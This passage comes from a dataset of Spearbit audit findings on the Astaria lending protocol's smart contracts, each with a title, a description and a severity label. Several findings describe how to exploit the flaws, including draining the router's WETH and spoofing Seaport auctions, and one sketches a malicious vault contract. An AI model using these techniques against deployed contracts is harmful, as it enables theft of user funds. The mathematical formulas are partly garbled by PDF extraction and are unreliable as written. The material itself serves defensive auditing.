and is the final value that is used. But the check is performed on params.collateralId. As a result, we can set the following:  params.encumber.lien.collateralId: collateral that is at auction.  params.collateralId: collateral not at auction. This will allow us to pass this validation while using the collateral at auction for the lien.", "labels": ["Spearbit", "Astaria", "Severity: High Risk"]}, {"title": "stateHash isn't updated by buyoutLien function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "We never update the collateral state hash anywhere in the buyoutLien function. As a result, once all checks are passed, payment will be transferred from the buyer to the seller, but the seller will retain ownership of the lien in the system's state.", "labels": ["Spearbit", "Astaria", "Severity: High Risk"]}, {"title": "If a collateral's liquidation auction on Seaport ends without a winning bid, the call to liquidatorN- FTClaim does not clear the related data on LienToken's side and also for payees that are public vaults", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "If/when a liquidation auction ends without being fulfilled/matched on Seaport and afterward when the current liquidator calls into liquidatorNFTClaim, the storage data (s.collateralStateHash, s.auctionData, s.lienMeta) on the LienToken side don't get reset/cleared and also the lien token does not get burnt. That means:  s.collateralStateHash[collateralId] stays equal to bytes32(\"ACTIVE_AUCTION\").  s.auctionData[collateralId] will have the past auction data.  s.lienMeta[collateralId].atLiquidation will be true. That means future calls to commitToLiens by holders of the same collateral will revert.", "labels": ["Spearbit", "Astaria", "Severity: High Risk"]}, {"title": "ClearingHouse cannot detect if a call from Seaport comes from a genuine listing or auction", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Anyone can create a SeaPort order with one of the considerations' recipients set to a ClearingHouse with a collateralId that is genuinely already set for auction. Once the spoofed order settles, SeaPort calls into this fallback function and causes the genuine Astaria auction to settle. This allows an attacker to set random items on sale on SeaPort with funds directed here (small buying prices) to settle genuine Astaria auctions on the protocol. This causes:  The Astaria auction payees and the liquidator would not receive what they would expect that should come from the auction. And if payee is a public vault it would introduce incorrect parameters into its system.  Lien data (s.lienMeta[lid]) and the lien token get deleted/burnt.  Collateral token and data get burnt/deleted.  When the actual genuine auction settles and calls back s.collateralIdToAuction[collateralId] check. to here, it will revert due to", "labels": ["Spearbit", "Astaria", "Severity: High Risk"]}, {"title": "c.lienRequest.strategy.vault is not checked to be a registered vault when commitToLiens is called", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "mentation(c.lienRequest.strategy.vault).commitToLien( ... ) of c.lienRequest.strategy.vault is not checked whether it is a registered vault within the system (by checking s.vaults). The caller can set this value to any address they would desire and potentially perform some unwanted actions. For example, the user could spoof all the values in commitments so that the later dependant contracts' checks are skipped and lastly we end up transferring funds: value after and the s.TRANSFER_PROXY.tokenTransferFrom( address(s.WETH), address(this), // <--- AstariaRouter address(msg.sender), totalBorrowed ); Not that since all checks are skipped, the caller can also indirectly set totalBorrowed to any value they would desire. And so, if AstariaRouter would hold any wETH at any point in time. Anyone can craft a payload to commitToLiens to drain its wETH balance.", "labels": ["Spearbit", "Astaria", "Severity: High Risk"]}, {"title": "Anyone can take a loan out on behalf of any collateral holder at any terms", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "In the _validateCommitment() function, the initial checks are intended to ensure that the caller who is requesting the lien is someone who should have access to the collateral that it's being taken out against. The caller also inputs a receiver, who will be receiving the lien. In this validation, this receiver is checked against the collateral holder, and the validation is approved in the case that receiver == holder. However, this does not imply that the collateral holder wants to take this loan. This opens the door to a malicious lender pushing unwanted loans on holders of collateral by calling commitToLien with their collateralId, as well as their address set to the receiver. This will pass the receiver == holder check and execute the loan. In the best case, the borrower discovers this and quickly repays the loan, incurring a fee and small amount of interest. In the worst case, the borrower doesn't know this happens, and their collateral is liquidated.", "labels": ["Spearbit", "Astaria", "Severity: High Risk"]}, {"title": "Strategist Interest Rewards will be 10x higher than expected due to incorrect divisor", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "VAULT_FEE is set as an immutable argument in the construction of new vaults, and is intended to be set in basis points. However, when the strategist interest rewards are calculated in _handleStrategistIntere- stReward(), the VAULT_FEE is only divided by 1000. The result is that the fee calculated by the function will be 10x higher than expected, and the strategist will be dramatically overpaid.", "labels": ["Spearbit", "Astaria", "Severity: High Risk"]}, {"title": "The lower bound for liquidationInitialAsk for new lines needs to be stricter", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "params.lien.details.liquidationInitialAsk ( Lnew ) is only compared to params.amount ( Anew ) whereas in _appendStack newStack[j].lien.details.liquidationInitialAsk ( Lj ) is compared to poten- tialDebt. potentialDebt is the aggregated sum of all potential owed amount at the end of each position/lien. So in _appendStack we have: onew + on + (cid:1) (cid:1) (cid:1) + oj (cid:20) Lj Where oj potential interest at the end of its term. is _getOwed(newStack[j], newStack[j].point.end) which is the amount for the stack slot plus the So it would make sense to enforce a stricter inequality for Lnew : (1 + r (tend (cid:0) tnow ) 1018 )Anew = onew (cid:20) Lnew The big issue regarding the current lower bound is when the borrower only takes one lien and for this lien liqui- dationInitialAsk == amount (or they are close). Then at any point during the lien term (maybe very close to the end), the borrower can atomically self liquidate and settle the Seaport auction in one transaction. This way the borrower can skip paying any interest (they would need to pay OpenSea fees and potentially royalty fees) and plus they would receive liquidation fees.", "labels": ["Spearbit", "Astaria", "Severity: High Risk"]}, {"title": "commitToLiens transfers extra assets to the borrower when protocol fee is present", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "totalBorrowed is the sum of all commitments[i].lienRequest.amount But if s.feeTo is set, some of funds/assets from the vaults get transefered to s.feeTo when _handleProtocolFee is called and only the remaining is sent to the ROUTER(). So in this scenario, the total amount of assets sent to ROUTER() (so that it can be transferred to msg.sender) is up to rounding errors: (1 (cid:0) np dp )T Where:  T is the totalBorrowed  np is s.protocolFeeNumerator  dp is s.protocolFeeDenominator But we are transferring T to msg.sender which is more than we are supposed to send,", "labels": ["Spearbit", "Astaria", "Severity: High Risk"]}, {"title": "Withdraw proxy's claim() endpoint updates public vault's yIntercept incorrectly.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Let parameter description y0 n En(cid:0)1 Bn(cid:0)1 Wn(cid:0)1 Sn(cid:0)1 Sv Bv V the yIntercept of our public vault in the question. the current epoch for the public vault. the expected storage parameter of the previous withdraw proxy. the asset balance of the previous withdraw proxy. the withdrawReserveReceived of the previous withdraw proxy. the total supply of the previous withdraw proxy. the total supply of the public vault when processEpoch() was last called on the public vault. the total balance of the public vault when processEpoch() was last called on the public vault. the public vault. 28 parameter description Pn(cid:0)1 the previous withdraw proxy. Then y0 is updated/decremented according to the formula (up to rounding errors due to division): y0 = y0 (cid:0) max(0, En(cid:0)1 (cid:0) (Bn(cid:0)1 (cid:0) Wn(cid:0)1))(1 (cid:0) Sn(cid:0)1 Sv ) Whereas the amount ( A ) of assets transfered from Pn(cid:0)1 to V is And the amount ( B ) of asset left in Pn(cid:0)1 after this transfer would be: A = (Bn(cid:0)1 (cid:0) Wn(cid:0)1)(1 (cid:0) Sn(cid:0)1 Sv ) B = Wn(cid:0)1 + (Bn(cid:0)1 (cid:0) Wn(cid:0)1) Sn(cid:0)1 Sv (cid:1) (Bn(cid:0)1 (cid:0) Wn(cid:0)1) is supposed to represent the payment withdrawal proxy receives from Seaport auctions plus the amount of assets transferred to it by external actors. So A represents the portion of this amount for users who have not withdrawn from the public vault on the previous epoch and it is transferred to V and so y0 should be compensated positively. Also note that this amount might be bigger than En(cid:0)1 if a lien has a really high liquida- tionInitialAsk and its auction fulfills/matches near that price on Seaport. So it is possible that En(cid:0)1 < A. The current update formula for updating the y0 has the following flaws:  It only considers updating y0 when En(cid:0)1 (cid:0) (Bn(cid:0)1 (cid:0) Wn(cid:0)1) > 0 which is not always the case.  Decrements y0 by a portion of En(cid:0)1. The correct updating formula for y0 should be: y0 = y0 (cid:0) En(cid:0)1 + (Bn(cid:0)1 (cid:0) Wn(cid:0)1)(1 (cid:0) Sn(cid:0)1 Sv ) Also note, if we let Bn(cid:0)1 (cid:0) Wn(cid:0)1 = Xn(cid:0)1 + (cid:15), where Xn(cid:0)1 is the payment received by the withdraw proxy from Seaport auction payments and (cid:15) (if Wn(cid:0)1 updated correctly) be assets received from external actors by the previous withdraw proxy. Then: B = Wn(cid:0)1 + (Xn(cid:0)1 + (cid:15)) Sn(cid:0)1 Sv (cid:1) = h max(0, Bv (cid:0) En(cid:0)1) + Xn(cid:0)1 + (cid:15) i Sn(cid:0)1 Sv (cid:1) The last equality comes from the fact that when the withdraw reserves is fully transferred from the public vault and the current withdraw proxy (if necessary) to the previous withdraw proxy the amount Wn(cid:0)1 would hold should be max(0, Bv (cid:0) En(cid:0)1) Sn(cid:0)1 . Sv (cid:1) Related Issue.", "labels": ["Spearbit", "Astaria", "Severity: High Risk"]}, {"title": "Public vault's yIntercept is not updated when the full amount owed is not paid out by a Seaport auction.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "When the full amountOwed for a lien is not paid out during the callback from Seaport to a collateral's ClearingHouse and if the payee is a public vault, we would need to decrement the yIntercept, otherwise the payee.totalAssets() would reflect a wrong value.", "labels": ["Spearbit", "Astaria", "Severity: High Risk"]}, {"title": "LienToken payee not reset on transfer", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "payee and ownerOf are detached in that owners may set payee and owner may transfer the LienTo- ken to a new owner. payee does not reset on transfer. Exploit scenario:  Owner of a LienToken sets themselves as payee  Owner of LienToken sells the lien to a new owner  New owner does not update payee  Payments go to address set by old owner", "labels": ["Spearbit", "Astaria", "Severity: High Risk"]}, {"title": "WithdrawProxy allows redemptions before PublicVault calls transferWithdrawReserve", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Anytime there is a withdraw pending (i.e. someone holds WithdrawProxy shares), shares may be redeemed so long as totalAssets() > 0 and s.finalAuctionEnd == 0. Under normal operating conditions totalAssets() becomes greater than 0 when then PublicVault calls trans- ferWithdrawReserve. totalAssets() can also be increased to a non zero value by anyone transferring WETH to the contract. If this occurs and a user attempts to redeem, they will receive a smaller share than they are owed. Exploit scenario:  Depositor redeems from PublicVault and receives WithdrawProxy shares.  Malicious actor deposits a small amount of WETH into the WithdrawProxy.  Depositor accidentally redeems, or is tricked into redeeming, from the WithdrawProxy while totalAssets() is smaller than it should be.  PublicVault properly processes epoch and full withdrawReserve is sent to WithdrawProxy.  All remaining holders of WithdrawProxy shares receive an outsized share as the previous shares we re- deemed for the incorrect value.", "labels": ["Spearbit", "Astaria", "Severity: High Risk"]}, {"title": "Point.position is not updated for stack slots in _removeStackPosition", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "uint8(params.stack.length) which would be its index in the stack. When _removeStackPosition is called to remove a slot newStack[i].point.position is not updated for indexes that are greater than position in the original stack. Also slot.point.position is only used when we emit AddLien and LienStackUpdated events. In both of those cases, we could have used params.stack.length", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "unchecked may cause under/overflows", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "unchecked should only be used when there is a guarantee of no underflows or overflows, or when they are taken into account. In absence of certainty, it's better to avoid unchecked to favor correctness over gas efficiency. For instance, if by error, protocolFeeNumerator is set to be greater than protocolFeeDenominator, this block in _handleProtocolFee() will underflow: PublicVault.sol#L640, unchecked { amount -= fee; } However, later this reverts due to the ERC20 transfer of an unusually high amount. This is just to demonstrate that unknown bugs can lead to under/overflows.", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk PublicVault.sol#L563, LienToken.sol#L424, LienToken.sol#L482, PublicVault.sol#L376, PublicVault.sol#L422, Public-"]}, {"title": "Multiple ERC4626Router and ERC4626RouterBase functions will always revert", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The intention of the ERC4626Router.sol functions is that they are approval-less ways to deposit and redeem: // For the below, no approval needed, assumes vault is already max approved As long as the user has approved the TRANSFER_PROXY for WETH, this works for the depositToVault function:  WETH is transferred from user to the router with pullTokens.  The router approves the vault for the correct amount of WETH.  vault.deposit() is called, which uses safeTransferFrom to transfer WETH from router into vault. However, for the redeemMax function, it doesn't work:  Approves the vault to spend the router's WETH.  vault.redeem() is called, which tries to transfer vault tokens from the router to the vault, and then mints withdraw proxy tokens to the receiver. This error happens assuming that the vault tokens would be burned, in which case the logic would work. But since they are transferred into the vault until the end of the epoch, we require approvals. The same issue also exists in these two functions in ERC4626RouterBase.sol:  redeem(): this is where the incorrect approval lives, so the same issue occurs when it is called directly.  withdraw(): the same faulty approval exists in this function.", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "UniV3 tokens with fees can bypass strategist checks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Each UniV3 strategy includes a value for fee in nlrDetails that is used to constrain their strategy to UniV3 pools with matching fees. This is enforced with the following check (where details.fee is the strategist's set fee, and fee is the fee returned from Uniswap): if (details.fee != uint24(0) && fee != details.fee) { revert InvalidFee(); } 33 This means that if you set details.fee to 0, this check will pass, even if the real fee is greater than zero.", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "If auction time is reduced, withdrawProxy can lock funds from final auctions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "When a new liquidation happens, the withdrawProxy sets s.finalAuctionEnd to be equal to the new incoming auction end. This will usually be fine, because new auctions start later than old auctions, and they all have the same length. However, if the auction time is reduced on the Router, it is possible for a new auction to have an end time that is sooner than an old auction. The result will be that the WithdrawProxy is claimable before it should be, and then will lock and not allow anyone to claim the funds from the final auction.", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "claim() will underflow and revert for all tokens without 18 decimals", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "In the claim() function, the amount to decrease the Y intercept of the vault is calculated as: (s.expected - balance).mulWadDown(10**ERC20(asset()).decimals() - s.withdrawRatio) s.withdrawRatio is represented as a WAD (18 decimals). As a result, using any token with a number of decimals under 17 (assuming the withdraw ratio is greater than 10%) will lead to an underflow and cause the function to revert. In this situation, the token's decimals don't matter. They are captured in the s.expected and balance, and are also the scale at which the vault's y-intercept is measured, so there's no need to adjust for them. Note: I know this isn't a risk in the current implementation, since it's WETH only, but since you are planning to generalize to accept all ERC20s, this is important.", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "Call to Royalty Engine can block NFT auction", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "_generateValidOrderParameters() calls ROYALTY_ENGINE.getRoyaltyView() twice. The first call is wrapped in a try/catch. This lets Astaria to continue even if the getRoyaltyView() reverts. However, the second call is not safe from this. Both these calls have the same parameters passed to it except the price (startingPrice vs endingPrice). case they are different, there exists a possibility that the second call can revert. In", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "Expired liens taken from public vaults need to be liquidated otherwise processing an epoch halts/reverts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "s.epochData[s.currentEpoch].liensOpenForEpoch is decremented or is supposed to be decre- mented, when for a lien with an end that falls on this epoch:  The full payment has been made,  Or the lien is bought out by a lien that is from a different vault or ends at a higher epoch,  Or the lien is liquidated. If for some reason a lien expires and no one calls liquidate, then s.epochData[s.currentEpoch].liensOpenForEpoch > 0 will be true and processEpoch() would revert till someones calls liquidate. Note that a lien's end falling in the s.currentEpoch and timeToEpochEnd() == 0 imply that the lien is expired. 35", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "assets < s.depositCap invariant can be broken for public vaults with non-zero deposit caps", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The following check in mint / deposit does not take into consideration the new shares / amount sup- plied to the endpoint, since the yIntercept in totalAssets() is only updated after calling super.mint(shares, receiver) or super.deposit(amount, receiver) with the afterDeposit hook. uint256 assets = totalAssets(); if (s.depositCap != 0 && assets >= s.depositCap) { revert InvalidState(InvalidStates.DEPOSIT_CAP_EXCEEDED); } Thus the new shares or amount provided can be a really big number compared to s.depositCap, but the call will still go through.", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "redeemFutureEpoch transfers the shares from the msg.sender to the vault instead of from the owner", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "redeemFutureEpoch transfers the vault shares from the msg.sender to the vault instead of from the owner.", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "Lien buyouts can push maxPotentialDebt over the limit", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "When a lien is bought out, _buyoutLien calls _getMaxPotentialDebtForCollateral to confirm that this number is lower than the maxPotentialDebt specified in the lien. However, this function is called with the existing stack, which hasn't yet replaced the lien with the new, bought out lien. Valid refinances can make the rate lower or the time longer. In the case that a lien was bought out for a longer duration, maxPotentialDebt will increase and could go over the limit specified in the lien.", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "Liens cannot be bought out once we've reached the maximum number of active liens on one collateral", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The buyoutLien function is intended to transfer ownership of a lien from one user to another. In practice, it creates a new lien by calling _createLien and then calls _replaceStackAtPositionWithNewLien to update the stack. In the _createLien function, there is a check to ensure we don't take out more than maxLiens against one piece of collateral: if (params.stack.length >= s.maxLiens) { revert InvalidState(InvalidStates.MAX_LIENS); } The result is that, when we already have maxLiens and we try to buy one out, this function will revert.", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "First vault deposit can cause excessive rounding", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Aside from storage layout/getters, the context above notes the other major departure from Solmate's ERC4626 implementation. The modification requires the initial mint to cost 10 full WETH. 37 + + + function mint( uint256 shares, address receiver ) public virtual returns (uint256 assets) { // assets is 10e18, or 10 WETH, whenever totalSupply() == 0 assets = previewMint(shares); // No need to check for rounding error, previewMint rounds up. // Need to transfer before minting or ERC777s could reenter. // minter transfers 10 WETH to the vault ERC20(asset()).safeTransferFrom(msg.sender, address(this), assets); // shares received are based on user input _mint(receiver, shares); emit Deposit(msg.sender, receiver, assets, shares); afterDeposit(assets, shares); } Astaria highlighted that the code diff from Solmate is in relation to this finding from the previous Sherlock audit. However, deposit is still unchanged and the initial deposit may be 1 wei worth of WETH, in return for 1 wad worth of vault shares. Further, the previously cited issue may still surface by calling mint in a way that sets the price per share high (e.g. 10 shares for 10 WETH produces a price per of 1:1e18). Albeit, at a higher cost to the minter to set the initial price that high.", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "When the collateral is listed on SeaPort by the borrower using listForSaleOnSeaport, when settled the liquidation fee will be sent to address(0)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "When the collateral s.auctionData[collateralId].liquidator (s.auctionData in general) will not be set and so it will be address(0) and thus the liquidatorPayment will be sent to address(0).", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "potentialDebt is not compared against a new lien's maxPotentialDebt in _appendStack", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "In _appendStack, we have the following block: newStack = new Stack[](stack.length + 1); newStack[stack.length] = newSlot; uint256 potentialDebt = _getOwed(newSlot, newSlot.point.end); ... if ( stack.length > 0 && potentialDebt > newSlot.lien.details.maxPotentialDebt ) { revert InvalidState(InvalidStates.DEBT_LIMIT); } Note, we are only performing a comparison between newSlot.lien.details.maxPotentialDebt and poten- tialDebt when stack.length > 0. If _createLien is called with params.stack.length == 0, we would not perform this check and thus the input params is not fully checked for misconfiguration.", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "Previous withdraw proxy's withdrawReserveReceived is not updated when assets are drained from the current withdraw proxy to the previous", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "When drain is called, we don't update the s.epochData[s.currentEpoch - 1]'s withdrawRe- serveReceived, this is in contrast to when withdraw reserves are transferred from the public vault to the withdraw proxy. This would unlink the previous withdraw proxy's withdrawReserveReceived storage parameter to the total amount of assets it has received from either the public vault or the current withdraw proxy. An actor can manipulate Bn(cid:0)1 (cid:0) Wn(cid:0)1's value by sending assets to the public vault and the current withdraw proxy before calling transferWithdrawReserve ( Bn(cid:0)1 is the previous withdraw proxy's asset balance, Wn(cid:0)1 is previous withdraw proxy's withdrawReserveReceived and n is public vault's epoch). Bn(cid:0)1 (cid:0) Wn(cid:0)1 should really represent the sum of all near-boundary auction payment's the previous withdraw proxy receives plus any assets that are transferred to it by an external actor. Related Issue 46.", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "Update solc version and use unchecked in Uniswap related libraries", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The highlighted libraries above are referenced from Uniswap codebase which is intended to work with Solidity compiler <0.8. These older versions have unchecked arithmetic by default and the code takes it into account. Astaria code is intended to work with Solidity compiler >=0.8 which doesn't have unchecked arithmetic by default. Hence, to port the code, it has to be turned on via unchecked keyword. For example, FullMathUniswap.mulDiv(type(uint).max, type(uint).max, type(uint).max) reverts for v0.8, and returns type(uint).max for older version.", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "buyoutLien is prone to race conditions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "LienToken.buyoutLien and VaultImplementation.buyoutLien are both prone to race conditions where multiple vaults can try to front-run each others' buyoutLien call to end up registering their own lien. Also note, due to the storage values s.minInterestBPS and s.minDurationIncrease being used in the is- ValidRefinance, the winning buyoutLien call does not necessarily have to have the best rate or duration among the other candidates in the race.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "ERC20-Cloned allows certain actions for address(0)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "In ERC20-Cloned, address(0) can be used as the:  spender (spender)  to parameter of transferFrom.  to parameter of transfer.  to parameter of _mint.  from parameter of _burn. As an example, one can transfer or transferFrom to address(0) which would turn the amount of tokens unus- able but those not update the total supply in contrast to if _burn was called.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "BEACON_PROXY_IMPLEMENTATION and WETH cannot be updated for AstariaRouter", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "There is no update mechanism for BEACON_PROXY_IMPLEMENTATION and WETH in AstariaRouter. It would make sense that one would want to keep WETH as not upgradable (unless we provide the wrong address to the constructor). But for BEACON_PROXY_IMPLEMENTATION there could be possibilities of potentially upgrading it.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "Incorrect key parameter type is used for s.epochData", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "In PublicVault, whenever the epoch key provided is to the mapping s.epochData its type is uint64, but the type of s.epochData is mapping(uint256 => EpochData)", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "buyoutLien, canLiquidate and makePayment have different notion of expired liens when considering edge cases", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "When swapping a lien that is just expired (lien's end tend equals to the current timestamp tnow ), one can call buyoutLien to swap it out. But when tnow > tend , buyoutLien reverts due to the underflow in _- getRemainingInterest when calculating the buyout amount. This is in contrast to canLiquidate which allows a lien with tnow = tend to liquidate as well. makePayment also only considers tend < tnow as expired liens. So the expired/non-functional liens time ranges for different endpoints are: endpoint expired range buyoutLien canLiquidate makePayment (tend , 1) [tend , 1) (tend , 1)", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "Ensure all ratios are less than 1", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Although, numerators and denominators for different fees are set by admin, it's a good practice to add a check in the contract for absurd values. In this case, that would be when numerator is greater than denominator.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "Factor out s.slope updates", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Slope updates occur in multiple locations but do not emit events.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "External call to arbitrary address", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The Router has a convenience function to commit to multiple liens AstariaRouter.commitToLiens. This function causes the router to receive WETH and allows the caller to supply an arbitrary vault address lien- Request.strategy.vault which is called by the router. This allows the potential for the caller to re-enter in the middle of the loop, and also allows them to drain any WETH that happens to be in the Router. In our review, no immediate reason for the Router to have WETH outside of commitToLiens calls was identified and therefore the severity of this finding is low.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "Astaria's Seaport orders may not be listed on OpenSea", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "To list Seaport orders on OpenSea, the order should pass certain validations as described here(see OpenSea Order Validation). Currently, Astaria orders will fail this validation. For instance, zone and zoneHash values are not set as suggested.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "Any ERC20 held in the Router can be stolen using ERC4626RouterBase functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "All four functions in ERC4626RouterBase.sol take in a vault address, a to address, a shares amount, and a maxAmountIn for validation. The first step is to read vault.asset() and then approve the vault to spend the ERC20 at whatever address is returned for the given amount. function mint( IERC4626 vault, address to, uint256 shares, uint256 maxAmountIn ) public payable virtual override returns (uint256 amountIn) { ERC20(vault.asset()).safeApprove(address(vault), shares); if ((amountIn = vault.mint(shares, to)) > maxAmountIn) { revert MaxAmountError(); } } In the event that the Router holds any ERC20, a malicious user can design a contract with the following functions: function asset() view pure returns (address) { return [ERC20 the router holds]; } function mint(uint shares, address to) view pure returns (uint) { return 0; } If this contract is passed as the vault, the function will pass, and the router will approve this contract to control its holdings of the given ERC20.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "Inconsistency in byte size of maxInterestRate", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "In RouterStorage, maxInterestRate has a size of uint88. However, when being set from file(), it is capped at uint48 by the safeCastTo48() function.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "Router#file has update for nonexistent MinInterestRate variable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "One of the options in the file() function is to update FileType.MinInterestRate. There are two problems here: 1) If someone chooses this FileType, the update actually happens to s.maxInterestRate. 2) There is no minInterestRate storage variable, as minInterestBPS is handled on L235-236.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "getLiquidationWithdrawRatio() and getYIntercept() have incorrect return types", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "liquidationWithdrawRatio and yIntercept like other amount-related parameters are of type uint88 (uint88) and they are the returned values of getLiquidationWithdrawRatio() and getYIntercept() re- spectively. But the return type of getLiquidationWithdrawRatio() and getYIntercept() are defined as uint256.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "The modified implementation of redeem is omitting a check to make sure not to redeem 0 assets.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The modified implementation of redeem is omitting the check // Check for rounding error since we round down in previewRedeem. require((assets = previewRedeem(shares)) != 0, \"ZERO_ASSETS\"); You can see a trail of it in redeemFutureEpoch.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "PublicVault's redeem and redeemFutureEpoch always returns 0 assets.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "assets returned by redeem and redeemFutureEpoch will always be 0, since it has not been set in redeemFutureEpoch. Also Withdraw event emits an incorrect value for asset because of this. The issue stems from trying to consolidate some of the logic for redeem and withdraw by using redeemFutureEpoch for both of them.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "OWNER() cannot be updated for private or public vaults", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "owner() is an immutable data for any ClonesWithImmutableArgs.clone that uses AstariaVault- Base. That means for example if there is an issue with the current hardcoded owner() there is no way to update it and 